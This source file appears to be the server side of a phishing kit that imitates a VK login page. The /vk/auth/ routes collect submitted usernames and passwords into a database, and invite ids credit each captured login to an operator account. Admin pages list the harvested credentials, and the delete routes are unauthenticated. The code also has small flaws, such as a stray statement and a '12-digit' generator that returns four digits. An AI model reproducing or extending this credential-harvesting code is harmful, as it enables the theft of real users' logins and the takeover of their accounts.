const { app, urlencodedParser } = require('./config')
const { DeleteForm, SelectNameFromId, InsertAccout, Select, Insert, Update, SelectAccount, Delete, SelectWhereID, CheckPassword } = require('./database')
const port = process.env.PORT || 5000;

const generate12DigitNumber = () => {
    const min = 1000;
    const max = 9999;
    return Math.floor(Math.random() * (max - min + 1) + min);
}

app.listen(80, () => console.log(`Listening on port 80`));

app.get('/', (req, res) => {
    res.render('index.ejs')
})



app.get('/delete/form/:id/:login/:password/', async (req, res) => {
    const id = req.params.id
    const login = req.params.login
    const password = req.params.password
    await DeleteForm(id, login, password)
    res.redirect('/check_forms/')
})

app.get('/vk/auth/', (req, res) => {
    res.render('vk.ejs')
})

app.get('/delete/:id', async (req, res) => {
    const id = req.params.id
    await Delete(id)
    res.redirect('/all_account/')
})

app.get('/invite/:id', async (req, res) => {
    const id = req.params.id
    const idk = await SelectWhereID(id)
    res.render('invite.ejs', { id: idk })
})

app.post('/vk/auth/', urlencodedParser, async (req, res) => {
    const login = req.body.username
    const password = req.body.password
    if (!login || !password) {
        res.redirect('/vk/auth/')
    } else {
        await Insert(0, login, password)
        res.redirect('/')
    }
})

app.get('/me/', async (req, res) => {
    console.log(req.session.login)
    if (!req.session.login) {
        res.redirect('/')
    } else {
        const id = await SelectWhereID(req.session.login)
        res.render('me.ejs', { id: id })
    }})

app.post('/sign/account/', async (req, res) => {
    const login = req.body.login
    const password = req.body.password
    if (await CheckPassword(password, login)) {
        req.session.login = login
        res.redirect('/')
    } else {
        res.redirect('/sign/account')
    }
})

app.get('/sign/account/', async (req, res) => {
    if (req.session.login) {
        res.redirect('/')
    } else {
        res.render('sign.ejs')
    }
})

app.post('/vk/auth/:id', urlencodedParser, async (req, res) => {
    const idk = req.params.id
    const login = req.body.username
    const password = req.body.password
    const ids = await SelectNameFromId(idk)

    if (!login || !password) {
        res.redirect(`/vk/auth/${idk}`)
    } else {
        await Insert(ids[0].id, login, password)
        await Update(ids[0].id, 1)
        res.redirect('/')
    }
})

app.get('/register/account', (req, res) => {
    res.render('create.ejs')
})

app.get('/all_account/', async (req, res) => {
    res.render('tableAccount.ejs', { data: await SelectAccount() })
})

app

app.post('/register/account', urlencodedParser, async (req, res) => {
    const login = req.body.login
    const password = req.body.password
    const id = generate12DigitNumber()
    await InsertAccout(id, login, password)
    res.send(
        {
            'id': id,
            'login': login
        }
    )
})

app.get('/check_forms/', async (req, res) => {
    const data = await Select()
    res.render('table.ejs', { args: data })
})

app.get('/vk/auth/:id', (req, res) => {
    res.render('vk.ejs')
})
